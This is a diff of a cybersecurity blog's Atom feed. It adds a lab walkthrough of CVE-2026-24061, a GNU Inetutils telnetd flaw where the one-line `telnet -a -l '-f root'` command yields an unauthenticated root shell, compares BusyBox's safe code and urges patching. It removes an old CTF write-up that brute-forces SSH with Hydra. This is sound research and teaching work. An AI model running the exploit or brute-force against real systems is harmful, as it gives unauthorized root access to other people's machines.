@@ -1,4 +1,269 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" /><updated>2026-01-25T19:23:38-06:00</updated><id>http://0.0.0.0:4000/feed.xml</id><title type="html">&lt;a href=&quot;/&quot; style=&quot;text-decoration:none;color:#b5e853;&quot;&gt;当て身 Atemi&lt;/a&gt;</title><subtitle>A Cybersecurity blog by shinris3n &lt;br&gt; 👊 &lt;a href = &quot;/writeups&quot;&gt;Writeups&lt;/a&gt; 👊 &lt;a href = &quot;/news&quot;&gt;News&lt;/a&gt; 👊 &lt;a href = &quot;/resources&quot;&gt;Resources&lt;/a&gt; &lt;br&gt;</subtitle><entry><title type="html">Gotta Crack Them All</title><link href="http://0.0.0.0:4000/writeups/2022/09/11/CSAW2022-GCTA.html" rel="alternate" type="text/html" title="Gotta Crack Them All" /><published>2022-09-11T17:11:21-05:00</published><updated>2022-09-11T17:11:21-05:00</updated><id>http://0.0.0.0:4000/writeups/2022/09/11/CSAW2022-GCTA</id><content type="html" xml:base="http://0.0.0.0:4000/writeups/2022/09/11/CSAW2022-GCTA.html"><![CDATA[<h1></h1>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" /><updated>2026-01-25T22:12:22-06:00</updated><id>http://0.0.0.0:4000/feed.xml</id><title type="html">&lt;a href=&quot;/&quot; style=&quot;text-decoration:none;color:#b5e853;&quot;&gt;当て身 Atemi&lt;/a&gt;</title><subtitle>A Cybersecurity blog by shinris3n &lt;br&gt; 👊 &lt;a href = &quot;/writeups&quot;&gt;Writeups&lt;/a&gt; 👊 &lt;a href = &quot;/news&quot;&gt;News&lt;/a&gt; 👊 &lt;a href = &quot;/resources&quot;&gt;Resources&lt;/a&gt; &lt;br&gt;</subtitle><entry><title type="html">CVE-2026-24061 - Telnet RCE Vulnerability Walkthrough and Analysis</title><link href="http://0.0.0.0:4000/news/2026/01/25/CVE-2026-24061-Analysis.html" rel="alternate" type="text/html" title="CVE-2026-24061 - Telnet RCE Vulnerability Walkthrough and Analysis" /><published>2026-01-25T20:09:21-06:00</published><updated>2026-01-25T20:09:21-06:00</updated><id>http://0.0.0.0:4000/news/2026/01/25/CVE-2026-24061-Analysis</id><content type="html" xml:base="http://0.0.0.0:4000/news/2026/01/25/CVE-2026-24061-Analysis.html"><![CDATA[<h2 id="vulnerability-cve-2026-24061-gnu-inetutils-telnetd">Vulnerability: CVE-2026-24061 (GNU Inetutils <code class="language-plaintext highlighter-rouge">telnetd</code>)</h2>
+
+<h4 id="its-been-a-few-years-since-ive-posted-anything-here-myself-or-on-behalf-of-team-ninpwn-even-though-ive-been-accruing-write-ups-for-ctfs-in-our-notes-that-never-make-it-over--figured-this-was-a-good-way-to-get-back-into-personal-community-contribution-though-outside-of-what-we-do-for-our-9-to-5s--enjoy">It’s been a few years since I’ve posted anything here myself or on behalf of Team NINPWN, even though I’ve been accruing write-ups for CTFs in our notes that never make it over.  Figured this was a good way to get back into personal community contribution though, outside of what we do for our 9 to 5s.  Enjoy!</h4>
+
+<p>We spent some time this weekend exploring <a href="https://nvd.nist.gov/vuln/detail/CVE-2026-24061" target="_blank">CVE-2026-24061</a>, the new RCE in GNU Inetutils <code class="language-plaintext highlighter-rouge">telnetd</code> that allows an attacker to inject arguments into the login process via the <code class="language-plaintext highlighter-rouge">USER</code> environment variable and bypass authentication.</p>
+
+<p>In short, <code class="language-plaintext highlighter-rouge">telnet -a -l '-f root' &lt;IP&gt;</code> will drop an attacker into root shell on all versions of this specific <code class="language-plaintext highlighter-rouge">telnetd</code> server from 2015 to present.</p>
+
+<p>We wanted to try this out for ourselves and, since Telnet is still everywhere in OT and embedded environments, we also wanted to see if this (or a possible variant) affected other common implementations like BusyBox. We spun up a lab to verify the exploit on GNU Inetutils and checked if BusyBox <code class="language-plaintext highlighter-rouge">telnetd</code> was also vulnerable.</p>
+
+<p>Below is our analysis along with a lab setup walkthrough for anyone who wants to experiment with this themselves.</p>
+
+<h2 id="tldr">TLDR</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left"><strong>Implementation</strong></th>
+      <th style="text-align: left"><strong>Status</strong></th>
+      <th style="text-align: left"><strong>Reason</strong></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left"><font color="red">GNU Inetutils</font></td>
+      <td style="text-align: left">Confirmed as Exploitable</td>
+      <td style="text-align: left">Unsafe template expansion (<code class="language-plaintext highlighter-rouge">%U</code>) of user-supplied data into the login command string.</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><font color="sky blue">BusyBox</font></td>
+      <td style="text-align: left">Not Exploitable (…but still just please stop using Telnet in 2026 and if you have to, restrict network access as much as possible…)</td>
+      <td style="text-align: left">Smart (or lazy) devs never implemented the <a href="https://www.rfc-editor.org/rfc/rfc1572.html" target="_blank">RFC 1572</a> option on the server side and use hardcoded arguments (<code class="language-plaintext highlighter-rouge">argv</code>) for execution.</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="lab-setup">Lab Setup</h2>
+
+<h3 id="step-1-environment-pre-reqs">Step 1: Environment Pre-reqs</h3>
+
+<p>To follow along, you just need a Linux host (we used <a href="https://cdimage.debian.org/debian-cd/current/amd64/iso-cd/debian-13.3.0-amd64-netinst.iso" target="_blank">Debian 13.3</a>) with Telnet pre-installed. For Docker installation we used:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Add Docker's official GPG key:</span>
+apt update <span class="o">&amp;&amp;</span> apt <span class="nb">install</span> <span class="nt">-y</span> ca-certificates curl gnupg
+<span class="nb">install</span> <span class="nt">-m</span> 0755 <span class="nt">-d</span> /etc/apt/keyrings
+curl <span class="nt">-fsSL</span> https://download.docker.com/linux/debian/gpg | gpg <span class="nt">--dearmor</span> <span class="nt">-o</span> /etc/apt/keyrings/docker.gpg
+<span class="nb">chmod </span>a+r /etc/apt/keyrings/docker.gpg
+
+<span class="c"># Add the repository to Apt sources:</span>
+<span class="nb">echo</span> <span class="se">\</span>
+  <span class="s2">"deb [arch=</span><span class="si">$(</span>dpkg <span class="nt">--print-architecture</span><span class="si">)</span><span class="s2"> signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/debian </span><span class="se">\</span><span class="s2">
+  </span><span class="si">$(</span><span class="nb">.</span> /etc/os-release <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"</span><span class="nv">$VERSION_CODENAME</span><span class="s2">"</span><span class="si">)</span><span class="s2"> stable"</span> | <span class="se">\</span>
+  <span class="nb">tee</span> /etc/apt/sources.list.d/docker.list <span class="o">&gt;</span> /dev/null
+
+<span class="c"># Install Docker:</span>
+apt update <span class="o">&amp;&amp;</span> apt <span class="nb">install</span> <span class="nt">-y</span> docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
+</code></pre></div></div>
+
+<h3 id="step-2-the-lab-setup">Step 2: The Lab Setup</h3>
+
+<p>We used two containers: one running the vulnerable GNU Inetutils daemon and one running the secure BusyBox implementation.</p>
+
+<ul>
+  <li><strong>Target 1: The Vulnerable Box (GNU)</strong></li>
+</ul>
+
+<p>We deployed an older Debian container (Buster) and install <code class="language-plaintext highlighter-rouge">inetutils-telnetd</code> and purposely left <code class="language-plaintext highlighter-rouge">/etc/securetty</code> active.  Normally, this stops root from logging in on pseudo-terminals, but as you’ll see, this exploit completely ignores it.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run <span class="nt">-d</span> <span class="se">\</span>
+  <span class="nt">--name</span> telnet-gnu <span class="se">\</span>
+  debian:buster <span class="se">\</span>
+  sh <span class="nt">-c</span> <span class="s2">"echo 'deb http://archive.debian.org/debian buster main' &gt; /etc/apt/sources.list &amp;&amp; </span><span class="se">\</span><span class="s2">
+  echo 'deb http://archive.debian.org/debian-security buster/updates main' &gt;&gt; /etc/apt/sources.list &amp;&amp; </span><span class="se">\</span><span class="s2">
+  apt-get -o Acquire::Check-Valid-Until=false update &amp;&amp; </span><span class="se">\</span><span class="s2">
+  DEBIAN_FRONTEND=noninteractive apt-get install -y inetutils-telnetd openbsd-inetd &amp;&amp; </span><span class="se">\</span><span class="s2">
+  useradd -m OTmaintenance &amp;&amp; </span><span class="se">\</span><span class="s2">
+  echo 'OTmaintenance:OTmaintenance123' | chpasswd &amp;&amp; </span><span class="se">\</span><span class="s2">
+  echo 'root:LabRoot123' | chpasswd &amp;&amp; </span><span class="se">\</span><span class="s2">
+  echo 'telnet stream tcp nowait root /usr/sbin/telnetd telnetd' &gt; /etc/inetd.conf &amp;&amp; </span><span class="se">\</span><span class="s2">
+  /usr/sbin/inetd -d"</span>
+</code></pre></div></div>
+
+<p><img src="/assets/news/cve-2026-24061/docker_setup_t1.png" alt="Docker Setup Target 1" /></p>
+
+<ul>
+  <li><strong>Target 2: The Unknown Box (BusyBox)</strong></li>
+</ul>
+
+<p>We deployed Alpine Linux with <code class="language-plaintext highlighter-rouge">busybox-extras</code> to serve as our other test system. This mimics the lightweight environment found in many IoT/OT devices.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run <span class="nt">-d</span> <span class="se">\</span>
+  <span class="nt">--name</span> telnet-busybox <span class="se">\</span>
+  alpine:3.22 <span class="se">\</span>
+  sh <span class="nt">-c</span> <span class="s2">"apk add --no-cache busybox-extras &amp;&amp; </span><span class="se">\</span><span class="s2">
+  adduser -D OTmaintenance &amp;&amp; </span><span class="se">\</span><span class="s2">
+  echo 'OTmaintenance:OTmaintenance123' | chpasswd &amp;&amp; </span><span class="se">\</span><span class="s2">
+  echo 'root:LabRoot123' | chpasswd &amp;&amp; </span><span class="se">\</span><span class="s2">
+  telnetd -F"</span>
+</code></pre></div></div>
+
+<p><img src="/assets/news/cve-2026-24061/docker_setup_t2.png" alt="Docker Setup Target 2" /></p>
+
+<p><img src="/assets/news/cve-2026-24061/docker_setup_2.png" alt="Running Docker Containers" /></p>
+
+<h3 id="step-3-the-exploit-mechanism-cve-2026-24061">Step 3: The Exploit Mechanism (CVE-2026-24061)</h3>
+
+<p>The exploit relies on two specific options in the standard <code class="language-plaintext highlighter-rouge">telnet</code> client, both of which facilitate <a href="https://www.rfc-editor.org/rfc/rfc1572.html" target="_blank">RFC 1572</a> (Telnet Environment Option), which the RFC describes as:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="s2">" ...a mechanism for passing environment
+   information between a telnet client and server.  Use of this
+   mechanism enables a telnet user to propagate configuration
+   information to a remote host when connecting."</span>
+</code></pre></div></div>
+
+<p>Checking out <code class="language-plaintext highlighter-rouge">telnet</code> options:</p>
+
+<p><img src="/assets/news/cve-2026-24061/telnet_help.png" alt="Telnet Help" /></p>
+
+<p><strong>1. <code class="language-plaintext highlighter-rouge">telnet -a</code> (Automatic Login)</strong></p>
+
+<ul>
+  <li>
+    <p>This option enables the client to attempt automatic login. It tells the client to send the <code class="language-plaintext highlighter-rouge">WILL NEW-ENVIRON</code> option during the initial negotiation handshake.</p>
+  </li>
+  <li>
+    <p>If the server agrees (responds with <code class="language-plaintext highlighter-rouge">DO NEW-ENVIRON</code>), the client is then permitted to send environment variables across the wire.</p>
+  </li>
+</ul>
+
+<p><strong>2. <code class="language-plaintext highlighter-rouge">telnet -l &lt;user&gt;</code> (Login Name)</strong></p>
+
+<ul>
+  <li>
+    <p>When you use <code class="language-plaintext highlighter-rouge">-l</code>, the client sets the <code class="language-plaintext highlighter-rouge">USER</code> environment variable to the string you provide.</p>
+  </li>
+  <li>
+    <p>The client does <em>not</em> validate the content of this string. It assumes you are providing a valid username (e.g., “shinris3n”). If you provide “<code class="language-plaintext highlighter-rouge">-f root</code>”, the client sets <code class="language-plaintext highlighter-rouge">USER="-f root"</code> and transmits it to the server.</p>
+  </li>
+</ul>
+
+<p>The vulnerable code snippet in <code class="language-plaintext highlighter-rouge">GNU_Inetutils_telnetd.c</code> is:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* Template command line for invoking login program.  */</span>
+
+<span class="kt">char</span> <span class="o">*</span><span class="n">login_invocation</span> <span class="o">=</span>
+<span class="cp">#ifdef SOLARIS10
+</span>  <span class="cm">/* TODO: `-s telnet' or `-s ktelnet'.
+   *       `-u' takes the Kerberos principal name
+   *       of the authenticating, remote user.
+   */</span>
+  <span class="n">PATH_LOGIN</span> <span class="s">" -p -h %h %?T{-t %T} -d %L %?u{-u %u}{%U}"</span>
+<span class="cp">#elif defined SOLARIS
+</span>  <span class="cm">/* At least for SunOS 5.8.  */</span>
+  <span class="n">PATH_LOGIN</span> <span class="s">" -h %h %?T{%T} %?u{-- %u}{%U}"</span>
+<span class="cp">#else </span><span class="cm">/* !SOLARIS */</span><span class="cp">
+</span>  <span class="n">PATH_LOGIN</span> <span class="s">" -p -h %h %?u{-f %u}{%U}"</span>
+<span class="cp">#endif
+</span>  <span class="p">;</span>
+
+</code></pre></div></div>
+
+<p>In the <code class="language-plaintext highlighter-rouge">!SOLARIS</code> branch, <code class="language-plaintext highlighter-rouge">%?u</code> evaluates to false because <code class="language-plaintext highlighter-rouge">%u</code> is reserved for sessions that have already authenticated via the Telnet protocol (like Kerberos). Since we are coming in unauthenticated, this is null and the <code class="language-plaintext highlighter-rouge">%U</code> path applies, then pulls what we supply via <code class="language-plaintext highlighter-rouge">-l</code>  and expands it directly into the command string without sanitization.</p>
+
+<p>In the context of the <code class="language-plaintext highlighter-rouge">login</code> binary:</p>
+
+<p><img src="/assets/news/cve-2026-24061/login_help.png" alt="Login Help" /></p>
+
+<p><u><b>Intended Behavior:</b></u> If we provide a standard username (e.g., <code class="language-plaintext highlighter-rouge">OTmaintenance</code>), the daemon constructs a command like this: <code class="language-plaintext highlighter-rouge">login -p -h &lt;host&gt; OTmaintenance</code> and the system just prompts for a password.</p>
+
+<p><u><b>Exploited Behavior:</b></u> By using the telnet <code class="language-plaintext highlighter-rouge">-l</code> option to inject flags into the username variable (e.g., <code class="language-plaintext highlighter-rouge">-f root</code>), the template expands to: <code class="language-plaintext highlighter-rouge">login -p -h &lt;host&gt; -f root</code> and the shell sees <code class="language-plaintext highlighter-rouge">-f</code> (force) as a flag for <code class="language-plaintext highlighter-rouge">login</code> rather than part of the username. This tells <code class="language-plaintext highlighter-rouge">login</code> that the user is already authenticated.</p>
+
+<h3 id="step-4-execution-and-verification">Step 4: Execution and Verification</h3>
+
+<p>First, grab the IP addresses:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker inspect <span class="nt">-f</span> <span class="s1">' - '</span> telnet-busybox telnet-gnu
+</code></pre></div></div>
+
+<p>Next, we execute the attack using the standard telnet client. The <code class="language-plaintext highlighter-rouge">-a</code> flag attempts automatic login and <code class="language-plaintext highlighter-rouge">-l</code> lets us specify our malicious user variable.</p>
+
+<p><strong>Super Complex Exploit String:</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>telnet <span class="nt">-a</span> <span class="nt">-l</span> <span class="s1">'-f root'</span> &lt;TARGET_IP&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <h3 id="gnu-inetutils-vulnerable">GNU Inetutils (Vulnerable)</h3>
+  </li>
+</ul>
+
+<p>When targeting the GNU container, you should see immediate root access:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Trying 172.17.0.2...
+Connected to 172.17.0.2.
+Escape character is '^]'.
+root@943b8243d87c:~# id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre></div></div>
+
+<p><strong>Bypassing /etc/securetty</strong></p>
+
+<p>We really wanted to highlight this part. Typically, Linux systems use <code class="language-plaintext highlighter-rouge">/etc/securetty</code> to prevent root logins on pseudo-terminals (<code class="language-plaintext highlighter-rouge">pts/0</code>).</p>
+
+<p><strong>This configuration is ignored.</strong></p>
+
+<p>Because the <code class="language-plaintext highlighter-rouge">-f</code> flag tells the <code class="language-plaintext highlighter-rouge">login</code> binary that the user is <em>already authenticated</em>, the entire authentication phase is skipped. This means <code class="language-plaintext highlighter-rouge">login</code> never checks <code class="language-plaintext highlighter-rouge">/etc/securetty</code> or prompts for a password. No configuration change to <code class="language-plaintext highlighter-rouge">login</code> or <code class="language-plaintext highlighter-rouge">securetty</code> will stop this; you have to patch the server code.</p>
+
+<p>In action:</p>
+
+<p><img src="/assets/news/cve-2026-24061/GNU.png" alt="GNU Attack" /></p>
+
+<ul>
+  <li>
+    <h3 id="busybox-not-exploitable">BusyBox (Not Exploitable)</h3>
+  </li>
+</ul>
+
+<p>When targeting the BusyBox container, the exploit fails:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Trying 172.17.0.3...
+Connected to 172.17.0.3.
+Escape character is '^]'.
+login: root
+Login incorrect
+</code></pre></div></div>
+
+<p>In action:</p>
+
+<p><img src="/assets/news/cve-2026-24061/BusyBox.png" alt="BusyBox Attack" /></p>
+
+<h3 id="step-5-code-analysis-why-the-exploit-doesnt-work-on-busyboxs-implementation">Step 5: Code Analysis (Why the Exploit Doesn’t Work on BusyBox’s Implementation)</h3>
+
+<p>A look at the source code for BusyBox <code class="language-plaintext highlighter-rouge">telnetd</code> (<code class="language-plaintext highlighter-rouge">busybox_telnetd.c</code>) shows why it is immune. Instead of using string templates to build the command, it manually constructs the argument array (<code class="language-plaintext highlighter-rouge">argv</code>) in C:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* busybox_telnetd.c */</span>
+<span class="n">login_argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">G</span><span class="p">.</span><span class="n">loginpath</span><span class="p">;</span> <span class="c1">// Resolves to /bin/login</span>
+<span class="n">login_argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>        <span class="c1">// Explicit terminator</span>
+<span class="n">BB_EXECVP</span><span class="p">(</span><span class="n">G</span><span class="p">.</span><span class="n">loginpath</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="p">)</span><span class="n">login_argv</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>By explicitly terminating the argument list at index 1, BusyBox ensures that no user-supplied data can be interpreted as a command-line flag.</p>
+
+<p>Not that this matters, because (even though their Telnet client supports it) BusyBox doesn’t even implement the <code class="language-plaintext highlighter-rouge">NEW-ENVIRON</code> option required to pass environment variables (like our malicious <code class="language-plaintext highlighter-rouge">USER</code> variable) in the first place. It explicitly handles <code class="language-plaintext highlighter-rouge">TELOPT_NAWS</code> (Window Size) but falls through for everything else, implicitly dropping our payload:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* busybox_telnetd.c */</span>
+<span class="k">if</span> <span class="p">(</span><span class="n">buf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="n">SB</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">buf</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="n">TELOPT_NAWS</span><span class="p">)</span> <span class="p">{</span>
+        <span class="cm">/* ... Logic to handle Window Size (NAWS) ... */</span>
+        <span class="cm">/* ... */</span>
+        <span class="k">goto</span> <span class="n">update_and_return</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="cm">/* else: other subnegs not supported yet */</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h3 id="cleanup">Cleanup</h3>
+
+<p>Once you are done testing, you can stop and remove the containers with:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker <span class="nb">rm</span> <span class="nt">-f</span> telnet-busybox telnet-gnu
+</code></pre></div></div>
+
+<h3 id="conclusion">Conclusion</h3>
+
+<p>From the coding perspective, this is a great example of why using string expansion for system calls is a bad idea, and in this case it allows for trivial takeover of affected systems. You can add this to the long list of reasons to stop using (or at least further restrict access to) Telnet in your environment. Since the exploit skips the authentication check entirely, standard hardening like <code class="language-plaintext highlighter-rouge">securetty</code> doesn’t help. The only real fix is patching.  It’s absolutely wild that this has gone undiscovered for 10+ years.</p>]]></content><author><name>shinris3n</name></author><category term="[&quot;news&quot;]" /><category term="Telnet" /><category term="RCE" /><category term="CVE-2026-24061" /><summary type="html"><![CDATA[Vulnerability: CVE-2026-24061 (GNU Inetutils telnetd)]]></summary></entry><entry><title type="html">Gotta Crack Them All</title><link href="http://0.0.0.0:4000/writeups/2022/09/11/CSAW2022-GCTA.html" rel="alternate" type="text/html" title="Gotta Crack Them All" /><published>2022-09-11T17:11:21-05:00</published><updated>2022-09-11T17:11:21-05:00</updated><id>http://0.0.0.0:4000/writeups/2022/09/11/CSAW2022-GCTA</id><content type="html" xml:base="http://0.0.0.0:4000/writeups/2022/09/11/CSAW2022-GCTA.html"><![CDATA[<h1></h1>
 <h3><font color="FF3030"> Challenge Text: </font></h3>
 
 <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">As an intern in the security department, you want to show the admin what a major security issue there is by having all passwords being from a wordlist (even if it is one the admin created) as well as potential issues with stream ciphers. 
@@ -2113,128 +2378,4 @@ flag{e915b62b2195d76bfddaac0160ed3194}
 0. Info
 1. Shake the dice
 2. Roll the dice (practice)
-3. Guess the dice (test)</span></code></pre></figure>]]></content><author><name>shinris3n</name></author><category term="[&quot;writeups&quot;]" /><category term="NahamConCTF2021" /><summary type="html"><![CDATA[Challenge Text]]></summary></entry><entry><title type="html">Hydraulic</title><link href="http://0.0.0.0:4000/writeups/2021/03/14/NahamCon2021-Hydraulic.html" rel="alternate" type="text/html" title="Hydraulic" /><published>2021-03-14T23:42:00-05:00</published><updated>2021-03-14T23:42:00-05:00</updated><id>http://0.0.0.0:4000/writeups/2021/03/14/NahamCon2021-Hydraulic</id><content type="html" xml:base="http://0.0.0.0:4000/writeups/2021/03/14/NahamCon2021-Hydraulic.html"><![CDATA[<h1></h1>
-<h3><font color="FF3030">Challenge Text</font></h3>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Author: @JohnHammond#6971
-
-This is Stage 2 of Path 5 in The Mission. After solving this challenge, you may need to refresh the page to see the newly unlocked challenges.
-
-Gain access with the information you have gathered thus far and retrieve the flag.
-
-You may bruteforce this challenge... hence the name ;)
-
-Press the Start button on the top-right to begin this challenge.
-</code></pre></div></div>
-
-<h1></h1>
-<h3><font color="FF3030">Solution</font></h3>
-
-<ul>
-  <li>Once finding new website directory structure via Lyra’s Twitter page and poking around a bit, we find http://constellations.page/constellations-documents/5/ with lists of user names and default passwords:</li>
-</ul>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CONSTELLATIONS Default Account Passwords
-INTERNAL: this should not be shared outside of the org
-Personnel Names
-
-User accounts following the naming convention of lowercase firstname.
-
-    orion
-    pavo
-    gus
-    vela
-    hercules
-    leo
-    lyra
-    gemini 
-
-Default Passwords
-
-    starstar
-    allstars
-    starstruck
-    starshine
-    starsky
-    popstars
-    starship
-    bluestars
-    pinkstars
-    superstars
-    ilovestars
-    rockstars
-    thestars
-    starscream
-    gostars
-    shootingstars
-    northstars
-    alpinestars
-    starsign
-    moonandstars
-    starsrock
-    luckystars
-    iluvstars
-    fivestars
-    redstars
-    mystars
-    lovestars
-    dallasstars
-    moonstars
-    sunmoonstars
-    starsailor
-    silverstars
-    sevenstars
-    lilstars
-    dotaallstars
-    sunstars
-    starsun
-    starsstars
-    starsareblind
-    pokerstars
-    magicstars
-    divastars
-    blackstars
-    starstarstar
-    starsearch
-    luvstars
-    greenstars
-    deathstars
-    brightstars
-    twinstars
-    starsinthesky
-    starshooter
-    starsha
-    threestars
-    summerstars
-    starspirit
-    starshollow
-    starsandstripes
-    starsandmoons
-    nightstars
-    metrostars
-    icstars
-    hoodstars
-    deadstars
-    citystars
-</code></pre></div></div>
-
-<ul>
-  <li>We can copy/paste these lists into separate files, then feed them into Hydra:</li>
-</ul>
-
-<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>hydra <span class="nt">-s</span> 32369 <span class="nt">-L</span> <span class="nb">users</span> <span class="nt">-P</span> ./passwords challenge.nahamcon.com <span class="nt">-t</span> 4 ssh 
-Hydra v9.1 <span class="o">(</span>c<span class="o">)</span> 2020 by van Hauser/THC &amp; David Maciejak - Please <span class="k">do </span>not use <span class="k">in </span>military or secret service organizations, or <span class="k">for </span>illegal purposes <span class="o">(</span>this is non-binding, these <span class="k">***</span> ignore laws and ethics anyway<span class="o">)</span><span class="nb">.</span>
-
-Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> starting at 2021-03-13 11:13:25
-<span class="o">[</span>DATA] max 4 tasks per 1 server, overall 4 tasks, 520 login tries <span class="o">(</span>l:8/p:65<span class="o">)</span>, ~130 tries per task
-<span class="o">[</span>DATA] attacking ssh://challenge.nahamcon.com:32369/
-<span class="o">[</span>STATUS] 36.00 tries/min, 36 tries <span class="k">in </span>00:01h, 484 to <span class="k">do in </span>00:14h, 4 active
-<span class="o">[</span>STATUS] 29.67 tries/min, 89 tries <span class="k">in </span>00:03h, 431 to <span class="k">do in </span>00:15h, 4 active
-<span class="o">[</span>32369][ssh] host: challenge.nahamcon.com   login: pavo   password: starsinthesky                                                                     
-<span class="o">[</span>STATUS] 31.00 tries/min, 217 tries <span class="k">in </span>00:07h, 303 to <span class="k">do in </span>00:10h, 4 active
-1 of 1 target successfully completed, 1 valid password found
-Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> finished at 2021-03-13 11:21:48</code></pre></figure>
-
-<ul>
-  <li>After this, it’s just a matter of loading the instance, logging in with these credentials via SSH and grabbing the flag in the user’s home directory.</li>
-</ul>]]></content><author><name>shinris3n</name></author><category term="[&quot;writeups&quot;]" /><category term="NahamConCTF2021" /><summary type="html"><![CDATA[Challenge Text]]></summary></entry></feed>
+3. Guess the dice (test)</span></code></pre></figure>]]></content><author><name>shinris3n</name></author><category term="[&quot;writeups&quot;]" /><category term="NahamConCTF2021" /><summary type="html"><![CDATA[Challenge Text]]></summary></entry></feed>
